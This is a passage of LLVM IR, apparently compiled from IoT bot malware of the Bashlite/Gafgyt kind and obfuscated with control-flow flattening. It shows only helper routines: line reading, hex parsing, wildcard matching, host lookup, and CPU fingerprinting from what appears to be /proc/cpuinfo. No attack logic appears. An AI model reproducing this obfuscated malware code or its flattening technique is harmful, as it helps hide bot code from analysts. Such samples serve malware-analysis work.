  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 550036898, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 1536371665, i32 -395102616
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 1888361201, i32 1774909016
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 -337353973, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 -337353973, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 1189906080, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -1760018350, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1760018350, label %9
    i32 1381092068, label %13
    i32 -1670251994, label %18
    i32 2077524392, label %27
    i32 -122616409, label %29
    i32 -120127774, label %39
    i32 -844721859, label %43
    i32 -1839682610, label %44
    i32 547409397, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 1381092068, i32 2077524392
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -1670251994, i32 2077524392
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 2077524392, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 -122616409, i32 -120127774
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 -1760018350, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 -844721859, i32 -1839682610
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 547409397, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 547409397, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 -1572682141, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1572682141, label %4
    i32 1709643319, label %10
    i32 1784170095, label %13
    i32 -1440647000, label %15
    i32 1239631345, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 1709643319, i32 1784170095
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 1784170095, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 -1440647000, i32 1239631345
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 -1572682141, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1208345198, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -1208345198, label %NodeBlock5
    i32 -1023996210, label %NodeBlock
    i32 604487460, label %LeafBlock3
    i32 -1238502554, label %LeafBlock1
    i32 -17712244, label %LeafBlock
    i32 1128903076, label %14
    i32 -1390363053, label %18
    i32 -1172628230, label %25
    i32 572909987, label %31
    i32 1630793938, label %38
    i32 -1860439751, label %39
    i32 -666021694, label %42
    i32 -1334861993, label %48
    i32 -262318001, label %56
    i32 191187834, label %NewDefault
    i32 21362906, label %59
    i32 -556245048, label %70
    i32 1957868105, label %78
    i32 38559506, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 -17712244, i32 -1023996210
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -1238502554, i32 604487460
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 -666021694, i32 191187834
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 -1390363053, i32 191187834
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 1128903076, i32 191187834
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 38559506, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 -1172628230, i32 -1860439751
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 572909987, i32 1630793938
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 1630793938, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 -1860439751, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 38559506, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 -1334861993, i32 -262318001
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 -262318001, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 38559506, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 21362906, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 -556245048, i32 1957868105
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 1957868105, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 38559506, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1471112243, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1471112243, label %first
    i32 -1500247747, label %13
    i32 -337548208, label %14
    i32 -1305950425, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -1500247747, i32 -337548208
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -1305950425, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1305950425, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 -1340387986, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1340387986, label %3
    i32 1980900461, label %8
    i32 2024838601, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 1980900461, i32 2024838601
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 -1340387986, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -62134419, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -62134419, label %8
    i32 1404464346, label %14
    i32 1555651359, label %21
    i32 -803711996, label %24
    i32 -1274934125, label %30
    i32 -506290090, label %36
    i32 91959202, label %41
    i32 1003473159, label %43
    i32 -799289181, label %46
    i32 -473876655, label %47
    i32 -875311047, label %57
    i32 -1083965073, label %66
    i32 -1872786118, label %68
    i32 1564763081, label %74
    i32 51806237, label %79
    i32 347830666, label %82
    i32 1939951614, label %88
    i32 1124088825, label %90
    i32 2030081628, label %93
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  %13 = select i1 %12, i32 1404464346, i32 1124088825
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %15)
  %16 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %17 = call i8* @strstr(i8* %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0)) #10
  %18 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %19 = icmp eq i8* %17, %18
  %20 = select i1 %19, i32 1555651359, i32 1939951614
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %23 = getelementptr inbounds i8, i8* %22, i64 8
  store i8* %23, i8** %6, align 8
  store i32 -803711996, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %6, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 32
  %29 = select i1 %28, i32 91959202, i32 -1274934125
  store i32 %29, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 9
  %35 = select i1 %34, i32 91959202, i32 -506290090
  store i32 %35, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 58
  store i32 91959202, i32* %switchVar
  store i1 %40, i1* %.reg2mem
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %42 = select i1 %.reload, i32 1003473159, i32 -799289181
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8*, i8** %6, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %6, align 8
  store i32 -803711996, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -473876655, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %6, align 8
  %49 = load i8*, i8** %6, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = sub i64 %50, 1
  %52 = getelementptr inbounds i8, i8* %48, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 13
  %56 = select i1 %55, i32 -1083965073, i32 -875311047
  store i32 %56, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8*, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = sub i64 %60, 1
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  store i32 -1083965073, i32* %switchVar
  store i1 %65, i1* %.reg2mem2
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %67 = select i1 %.reload3, i32 -1872786118, i32 1564763081
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  store i32 -473876655, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %6, align 8
  %76 = call i8* @strchr(i8* %75, i32 46) #10
  %77 = icmp ne i8* %76, null
  %78 = select i1 %77, i32 51806237, i32 347830666
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %6, align 8
  %81 = call i8* @strchr(i8* %80, i32 46) #10
  store i8 0, i8* %81, align 1
  store i32 347830666, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %3, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = call i8* @strcpy(i8* %83, i8* %84) #2
  %86 = load i32, i32* %4, align 4
  %87 = call i32 @close(i32 %86)
  store i32 0, i32* %2, align 4
  store i32 2030081628, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %89, i8 0, i64 4096, i32 16, i1 false)
  store i32 -62134419, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %4, align 4
  %92 = call i32 @close(i32 %91)
  store i32 1, i32* %2, align 4
  store i32 2030081628, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %2, align 4
  ret i32 %94

loopEnd:                                          ; preds = %90, %88, %82, %79, %74, %68, %66, %57, %47, %46, %43, %41, %36, %30, %24, %21, %14, %8, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  %switchVar = alloca i32
  store i32 773628374, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 773628374, label %5
    i32 -1255184730, label %11
    i32 1469970728, label %18
    i32 -1844826500, label %21
    i32 -686819032, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  %10 = select i1 %9, i32 -1255184730, i32 -686819032
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %12)
  %13 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0)) #10
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %16 = icmp eq i8* %14, %15
  %17 = select i1 %16, i32 1469970728, i32 -1844826500
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %1, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %1, align 4
  store i32 -1844826500, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  store i32 773628374, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %21, %18, %11, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 140479718, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 140479718, label %6
    i32 181214805, label %11
    i32 -1751266431, label %20
    i32 -1814774154, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
